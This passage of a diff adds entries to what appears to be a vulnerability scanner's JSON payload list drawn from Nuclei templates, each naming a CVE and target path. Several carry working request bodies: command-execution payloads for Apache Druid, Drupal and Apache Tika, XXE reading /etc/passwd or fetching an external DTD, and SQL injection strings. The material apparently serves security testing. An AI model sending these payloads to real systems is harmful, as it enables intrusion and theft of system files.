+          "body": "{\"type\":\"kafka\",\"spec\":{\"type\":\"kafka\",\"ioConfig\":{\"type\":\"kafka\",\"consumerProperties\":{\"bootstrap.servers\":\"127.0.0.1:6666\",\"sasl.mechanism\":\"OAUTHBEARER\",\"security.protocol\":\"SASL_SSL\",\"sasl.login.callback.handler.class\":\"org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler\",\"sasl.oauthbearer.token.endpoint.url\":\"file:///etc/passwd\",\"sasl.jaas.config\":\"org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required sasl.oauthbearer.token.endpoint.url=\\\"http://127.0.0.1:9999/token\\\" sasl.oauthbearer.jwks.endpoint.url=\\\"http://127.0.0.1:9999/jwks\\\" sasl.oauthbearer.client.id=your-client-id sasl.oauthbearer.client.secret=your-client-secret sasl.oauthbearer.expected.audience=kafka sasl.oauthbearer.expected.issuer=\\\"http://127.0.0.1:9999\\\" useFirstPass=true serviceName=kafka debug=true;\"},\"topic\":\"test\",\"useEarliestOffset\":true,\"inputFormat\":{\"type\":\"regex\",\"pattern\":\"([\\\\s\\\\S]*)\",\"listDelimiter\":\"\",\"columns\":[\"raw\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"1970-01-01T00:00:00Z\"},\"dimensionsSpec\":{},\"granularitySpec\":{\"rollup\":false}},\"tuningConfig\":{\"type\":\"kafka\"}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_9916",
+          "name": "CVE-2024-9916 HuangDou UTCMS V9 - OS Command Injection",
+          "payload": "/app/modules/ut-cac/admin/cli.php",
+          "description": "[Nuclei] HuangDou UTCMS V9 - OS Command Injection",
+          "risk": "high",
+          "cve": "CVE-2024-9916",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-9916",
+          "applies_to": {
+            "path_contains": [
+              "modules"
+            ],
+            "powered_by": [
+              "php"
+            ]
+          },
+          "body": "o=nohup id",
+          "headers": {
+            "Origin": "",
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_21975",
+          "name": "CVE-2021-21975 vRealize Operations Manager API - Server-Side Request Forgery",
+          "payload": "/casa/nodes/thumbprints",
+          "description": "[Nuclei] vRealize Operations Manager API - Server-Side Request Forgery",
+          "risk": "high",
+          "cve": "CVE-2021-21975",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-21975",
+          "applies_to": {
+            "path_contains": [
+              "casa",
+              "nodes"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          },
+          "body": "[\"127.0.0.1:443/ui/\"]",
+          "headers": {
+            "Content-Type": "application/json;charset=UTF-8"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_25646",
+          "name": "CVE-2021-25646 Apache Druid - Remote Code Execution",
+          "payload": "/druid/indexer/v1/sampler",
+          "description": "[Nuclei] Apache Druid - Remote Code Execution",
+          "risk": "high",
+          "cve": "CVE-2021-25646",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-25864",
+          "applies_to": {
+            "path_contains": [
+              "druid",
+              "indexer"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "{\n\"type\":\"index\",\n\"spec\":{\n   \"ioConfig\":{\n      \"type\":\"index\",\n      \"firehose\":{\n         \"type\":\"local\",\n         \"baseDir\":\"/etc\",\n         \"filter\":\"passwd\"\n      }\n   },\n   \"dataSchema\":{\n      \"dataSource\":\"odgjxrrrePz\",\n      \"parser\":{\n         \"parseSpec\":{\n            \"format\":\"javascript\",\n            \"timestampSpec\":{\n\n            },\n            \"dimensionsSpec\":{\n\n            },\n            \"function\":\"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"/bin/sh`@~-c`@~cat /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\",\n            \"\":{\n               \"enabled\":\"true\"\n            }\n         }\n      }\n   }\n},\n\"samplerConfig\":{\n   \"numRows\":10\n}\n}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_27358",
+          "name": "CVE-2021-27358 Grafana Unauthenticated Snapshot Creation",
+          "payload": "/api/snapshots",
+          "description": "[Nuclei] Grafana Unauthenticated Snapshot Creation",
+          "risk": "high",
+          "cve": "CVE-2021-27358",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-27358",
+          "applies_to": {
+            "path_contains": [
+              "snapshots"
+            ],
+            "powered_by": [
+              "grafana"
+            ]
+          },
+          "body": "{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_11991",
+          "name": "CVE-2020-11991 Apache Cocoon 2.1.12 - XML Injection",
+          "payload": "/v2/api/product/manger/getInfo",
+          "description": "[Nuclei] Apache Cocoon 2.1.12 - XML Injection",
+          "risk": "high",
+          "cve": "CVE-2020-11991",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-11991",
+          "applies_to": {
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<userInfo>\n<firstName>John</firstName>\n<lastName>&ent;</lastName>\n</userInfo>\n",
+          "headers": {
+            "Content-Type": "text/xml"
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_9483",
+          "name": "CVE-2020-9483 SkyWalking SQLI",
+          "payload": "/graphql",
+          "description": "[Nuclei] SkyWalking SQLI",
+          "risk": "high",
+          "cve": "CVE-2020-9483",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-9483",
+          "applies_to": {
+            "path_contains": [
+              "graphql"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "{\"query\":\"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\\\"all_p99\\\",id:\\\"') UNION SELECT 1,CONCAT('~','9999999999','~')-- \\\",}, duration: $d){values{value}}}\",\"variables\":{\"d\":{\"start\":\"2021-11-11\",\"end\":\"2021-11-12\",\"step\":\"DAY\"}}}\n",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_6340",
+          "name": "CVE-2019-6340 Drupal - Remote Code Execution",
+          "payload": "/node/1?_format=hal_json",
+          "description": "[Nuclei] Drupal - Remote Code Execution",
+          "risk": "high",
+          "cve": "CVE-2019-6340",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-6340",
+          "applies_to": {
+            "path_contains": [
+              "node"
+            ],
+            "powered_by": [
+              "drupal"
+            ]
+          },
+          "body": "{ \"link\": [ { \"value\": \"link\", \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:2:\\\"id\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\" } ], \"_links\": { \"type\": { \"href\": \"http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default\" } } }"
+        },
+        {
+          "id": "nuclei_cve_2019_6793",
+          "name": "CVE-2019-6793 GitLab Enterprise Edition - Server-Side Request Forgery",
+          "payload": "/-/jira/login/oauth/access_token",
+          "description": "[Nuclei] GitLab Enterprise Edition - Server-Side Request Forgery",
+          "risk": "high",
+          "cve": "CVE-2019-6793",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-6793",
+          "applies_to": {
+            "path_contains": [
+              "jira"
+            ],
+            "powered_by": [
+              "gitlab"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_1335",
+          "name": "CVE-2018-1335 Apache Tika < 1.1.8 - Header Command Injection",
+          "payload": "/meta",
+          "description": "[Nuclei] Apache Tika < 1.1.8 - Header Command Injection",
+          "risk": "high",
+          "cve": "CVE-2018-1335",
+          "location": "path",
+          "param": "",
+          "method": "PUT",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-1335",
+          "applies_to": {
+            "path_contains": [
+              "meta"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
+          "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_8033",
+          "name": "CVE-2018-8033 Apache OFBiz - XML External Entity Injection",
+          "payload": "/webtools/control/httpService",
+          "description": "[Nuclei] Apache OFBiz - XML External Entity Injection",
+          "risk": "high",
+          "cve": "CVE-2018-8033",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-8033",
+          "applies_to": {
+            "path_contains": [
+              "webtools",
+              "control"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "serviceName=createPartyGroup&serviceMode=sync&serviceContext=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY %25 request SYSTEM 'https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/xxe-poc.dtd'>%25request;%25secondstage;]><r>%26disclose;</r>",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2011_3600",
+          "name": "CVE-2011-3600 Apache OFBiz - XML External Entity Injection",
+          "payload": "/webtools/control/xmlrpc",
+          "description": "[Nuclei] Apache OFBiz - XML External Entity Injection",
+          "risk": "high",
+          "cve": "CVE-2011-3600",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2011-3600",
+          "applies_to": {
+            "path_contains": [
+              "webtools",
+              "control"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY disclose SYSTEM \"file:////etc/passwd\">]><methodCall><methodName>&disclose;</methodName></methodCall>",
+          "headers": {
+            "Content-Type": "application/xml"
+          }
+        },
+        {
+          "id": "nuclei_cve_2009_1151",
+          "name": "CVE-2009-1151 PhpMyAdmin Scripts - Remote Code Execution",
+          "payload": "/scripts/setup.php",
+          "description": "[Nuclei] PhpMyAdmin Scripts - Remote Code Execution",
+          "risk": "high",
+          "cve": "CVE-2009-1151",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2009-1151",
+          "applies_to": {
+            "path_contains": [
+              "scripts",
+              "setup.php"
+            ],
+            "powered_by": [
+              "phpmyadmin"
+            ]
+          },
+          "body": "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}",
+          "headers": {
+            "Accept-Encoding": "gzip, deflate",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_12394",
+          "name": "CVE-2026-12394 WordPress MemberGlut < 1.1.5 - Unauthenticated Privilege Escalation",
+          "payload": "/register/",
+          "description": "[Nuclei] WordPress MemberGlut < 1.1.5 - Unauthenticated Privilege Escalation",
+          "risk": "critical",
+          "cve": "CVE-2026-12394",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-12394",
+          "applies_to": {
+            "path_contains": [
+              "register"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_20079",
+          "name": "CVE-2026-20079 Cisco Secure Firewall Management Center - Authentication Bypass",
+          "payload": "/help/about.cgi",
+          "description": "[Nuclei] Cisco Secure Firewall Management Center - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-20079",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-20079",
+          "applies_to": {
+            "path_contains": [
+              "help",
+              "about.cgi"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_20896",
+          "name": "CVE-2026-20896 Gitea Docker Image <= 1.26.2 - Reverse Proxy Header Authentication Bypass",
+          "payload": "/api/v1/version",
+          "description": "[Nuclei] Gitea Docker Image <= 1.26.2 - Reverse Proxy Header Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-20896",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-20896",
+          "applies_to": {
+            "powered_by": [
+              "gitea"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_22557",
+          "name": "CVE-2026-22557 UniFi Network Application - Path Traversal",
+          "payload": "/guest/s/default/login?page_error=..%2F..%2Fweb.xml",
+          "description": "[Nuclei] UniFi Network Application - Path Traversal",
+          "risk": "critical",
+          "cve": "CVE-2026-22557",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-22557",
+          "applies_to": {
+            "path_contains": [
+              "guest"
+            ]
+          },
+          "headers": {
+            "Referer": "/guest/s/default/?id=aa:bb:cc:dd:ee:ff&ap=00:11:22:33:44:55&ssid=test&url=http://example.com"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_33478",
+          "name": "CVE-2026-33478 AVideo <= 26.0 - WWBN AVideo - Remote Code Execution",
+          "payload": "/plugin/CloneSite/clones.json.php",
+          "description": "[Nuclei] AVideo <= 26.0 - WWBN AVideo - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2026-33478",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://github.com/WWBN/AVideo/security/advisories/GHSA-687q-32c6-8x68",
+          "applies_to": {
+            "path_contains": [
+              "plugin",
+              "clonesite"
+            ]
+          },
+          "headers": {
+            "Accept": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_34413",
+          "name": "CVE-2026-34413 Xerte Online Toolkits <= 3.15 - Remote Code Execution",
+          "payload": "/setup/",
+          "description": "[Nuclei] Xerte Online Toolkits <= 3.15 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2026-34413",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-34413",
+          "applies_to": {
+            "path_contains": [
+              "setup"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_42589",
+          "name": "CVE-2026-42589 Gotenberg - Command Injection",
+          "payload": "/version",
+          "description": "[Nuclei] Gotenberg - Command Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-42589",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-42589",
+          "applies_to": {
+            "path_contains": [
+              "version"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_46339",
+          "name": "CVE-2026-46339 9Router <= 0.4.36 - Unauthenticated RCE",
+          "payload": "/api/version",
+          "description": "[Nuclei] 9Router <= 0.4.36 - Unauthenticated RCE",
+          "risk": "critical",
+          "cve": "CVE-2026-46339",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-46339",
+          "applies_to": {
+            "path_contains": [
+              "version"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_48939",
+          "name": "CVE-2026-48939 Joomla iCagenda < 3.9.10 - Unauthenticated Arbitrary File Upload RCE",
+          "payload": "/administrator/",
+          "description": "[Nuclei] Joomla iCagenda < 3.9.10 - Unauthenticated Arbitrary File Upload RCE",
+          "risk": "critical",
+          "cve": "CVE-2026-48939",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-48939",
+          "applies_to": {
+            "path_contains": [
+              "administrator"
+            ],
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_56265",
+          "name": "CVE-2026-56265 Crawl4AI < 0.8.7 - Hardcoded JWT Signing Key Authentication Bypass",
+          "payload": "/ask?context_type=code&query=crawl&max_results=1",
+          "description": "[Nuclei] Crawl4AI < 0.8.7 - Hardcoded JWT Signing Key Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-56265",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-56265",
+          "applies_to": {
+            "path_contains": [
+              "ask"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_58644",
+          "name": "CVE-2026-58644 Microsoft SharePoint Server - WS-Federation BinaryFormatter Deserialization RCE",
+          "payload": "/_trust/default.aspx",
+          "description": "[Nuclei] Microsoft SharePoint Server - WS-Federation BinaryFormatter Deserialization RCE",
+          "risk": "critical",
+          "cve": "CVE-2026-58644",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-58644",
+          "applies_to": {
+            "path_contains": [
+              "_trust",
+              "default.aspx"
+            ],
+            "powered_by": [
+              "sharepoint"
+            ]
+          },
+          "headers": {
+            "Connection": "close"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_59801",
+          "name": "CVE-2026-59801 9Router - Unauthenticated LLM Provider API Exposure",
+          "payload": "/api/version",
+          "description": "[Nuclei] 9Router - Unauthenticated LLM Provider API Exposure",
+          "risk": "critical",
+          "cve": "CVE-2026-59801",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-59801",
+          "applies_to": {
+            "path_contains": [
+              "version"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_60004",
+          "name": "CVE-2026-60004 Gitea <= 1.27.0 - Pre-Auth Remote Code Execution",
+          "payload": "/user/sign_up",
+          "description": "[Nuclei] Gitea <= 1.27.0 - Pre-Auth Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2026-60004",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-60004",
+          "applies_to": {
+            "path_contains": [
+              "sign_up"
+            ],
+            "powered_by": [
+              "gitea"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_71362",
+          "name": "CVE-2026-71362 Adobe Commerce/Magento - Customer Session Identity Switch",
+          "payload": "/customer/account/create",
+          "description": "[Nuclei] Adobe Commerce/Magento - Customer Session Identity Switch",
+          "risk": "critical",
+          "cve": "CVE-2026-71362",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-71362",
+          "applies_to": {
+            "path_contains": [
+              "customer",
+              "account"
+            ],
+            "powered_by": [
+              "magento"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_77806",
+          "name": "CVE-2026-77806 SPIP < 4.4.22 - Unauthenticated RCE",
+          "payload": "/spip.php",
+          "description": "[Nuclei] SPIP < 4.4.22 - Unauthenticated RCE",
+          "risk": "critical",
+          "cve": "CVE-2026-77806",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://securityonline.info/cve-2026-77806-spip-unauthenticated-rce/",
+          "applies_to": {
+            "path_contains": [
+              "spip.php"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_8054",
+          "name": "CVE-2026-8054 dotCMS Core Publish Audit API - Unauthenticated SQL Injection",
+          "payload": "/api/auditPublishing/getAll",
+          "description": "[Nuclei] dotCMS Core Publish Audit API - Unauthenticated SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-8054",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://github.com/advisories/GHSA-jpx3-25r2-jq5g",
+          "applies_to": {
+            "path_contains": [
+              "auditpublishing"
+            ]
+          },
+          "body": "[\"x' || (SELECT CASE WHEN 1=2 THEN pg_sleep(0)::text ELSE '' END) || '\"]",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_0674",
+          "name": "CVE-2025-0674 Elber ESE DVB-S/S2 - Authentication Bypass",
+          "payload": "/modules/pwd.html",
+          "description": "[Nuclei] Elber ESE DVB-S/S2 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2025-0674",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-0674",
+          "applies_to": {
+            "path_contains": [
+              "modules",
+              "pwd.html"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_11953",
+          "name": "CVE-2025-11953 React Native Community CLI - Unauthenticated OS Command Injection",
+          "payload": "/status",
+          "description": "[Nuclei] React Native Community CLI - Unauthenticated OS Command Injection",
+          "risk": "critical",
+          "cve": "CVE-2025-11953",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-11953",
+          "applies_to": {
+            "path_contains": [
+              "status"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_12480",
+          "name": "CVE-2025-12480 Triofox - Improper Access Control",
+          "payload": "/management/admindatabase.aspx",
+          "description": "[Nuclei] Triofox - Improper Access Control",
+          "risk": "critical",
+          "cve": "CVE-2025-12480",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-12480",
+          "applies_to": {
+            "path_contains": [
+              "management",
+              "admindatabase.aspx"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_13390",
+          "name": "CVE-2025-13390 WP Directory Kit <= 1.4.4 - Authentication Bypass",
+          "payload": "/?auto-login=1&user_id=1&token=c4ca4238a0",
+          "description": "[Nuclei] WP Directory Kit <= 1.4.4 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2025-13390",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-13390",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_25257",
+          "name": "CVE-2025-25257 Fortinet FortiWeb - SQL Injection",
+          "payload": "/api/fabric/device/status",
+          "description": "[Nuclei] Fortinet FortiWeb - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2025-25257",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/",
+          "applies_to": {
+            "path_contains": [
+              "fabric"
+            ],
+            "powered_by": [
+              "fortinet"
+            ]
+          },
+          "headers": {
+            "Authorization": "Bearer AAAAAA'or'1'='1"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_47646",
+          "name": "CVE-2025-47646 PSW Front-end Login & Registration 1.13 - Weak Password Recovery",
+          "payload": "/wp-login.php",
+          "description": "[Nuclei] PSW Front-end Login & Registration 1.13 - Weak Password Recovery",
+          "risk": "critical",
+          "cve": "CVE-2025-47646",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://github.com/RootHarpy/CVE-2025-47646",
+          "applies_to": {
+            "path_contains": [
+              "wp-login.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_5947",
+          "name": "CVE-2025-5947 Service Finder Bookings - Authentication Bypass",
+          "payload": "/wp-admin/admin-ajax.php?action=service_finder_switch_back",
+          "description": "[Nuclei] Service Finder Bookings - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2025-5947",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-5947",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "headers": {
+            "Cookie": "original_user_id=1"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_10924",
+          "name": "CVE-2024-10924 Really Simple Security < 9.1.2 - Authentication Bypass",
+          "payload": "/wp-login.php",
+          "description": "[Nuclei] Really Simple Security < 9.1.2 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2024-10924",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-10924",
+          "applies_to": {
+            "path_contains": [
+              "wp-login.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_24882",
+          "name": "CVE-2024-24882 Masteriyo LMS <= 1.7.2 - Unauthenticated Privilege Escalation",
+          "payload": "/account/signup/",
+          "description": "[Nuclei] Masteriyo LMS <= 1.7.2 - Unauthenticated Privilege Escalation",
+          "risk": "critical",
+          "cve": "CVE-2024-24882",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-24882",
+          "applies_to": {
+            "path_contains": [
+              "account",
+              "signup"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_30502",
+          "name": "CVE-2024-30502 WP Travel Engine <= 5.7.9 - SQL Injection",
+          "payload": "/trip/",
+          "description": "[Nuclei] WP Travel Engine <= 5.7.9 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-30502",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-30502",
+          "applies_to": {
+            "path_contains": [
+              "trip"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_3605",
+          "name": "CVE-2024-3605 WP Hotel Booking <= 2.1.0 - SQL Injection",
+          "payload": "/wp-json/wphb/v1/rooms/search-rooms?check_in_date=2025-01-01&check_out_date=2025-01-10&adults=4&max_child=0&paged=1&room_type=1",
+          "description": "[Nuclei] WP Hotel Booking <= 2.1.0 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-3605",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-3605",
+          "applies_to": {
+            "path_contains": [
+              "wp-json",
+              "wphb"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_43441",
+          "name": "CVE-2024-43441 Apache HugeGraph-Server <1.5.0 - Authentication Bypass",
+          "payload": "/graphs",
+          "description": "[Nuclei] Apache HugeGraph-Server <1.5.0 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2024-43441",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://github.com/advisories/GHSA-f697-gm3h-xrf9",
+          "applies_to": {
+            "path_contains": [
+              "graphs"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_43917",
+          "name": "CVE-2024-43917 WordPress TI WooCommerce Wishlist Plugin <= 2.8.2 - SQL Injection",
+          "payload": "/?p=1",
+          "description": "[Nuclei] WordPress TI WooCommerce Wishlist Plugin <= 2.8.2 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-43917",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-43917",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_56325",
+          "name": "CVE-2024-56325 Apache Pinot < 1.3.0 - Authentication Bypass",
+          "payload": "/users",
+          "description": "[Nuclei] Apache Pinot < 1.3.0 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2024-56325",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://www.zerodayinitiative.com/advisories/ZDI-25-109/",
+          "applies_to": {
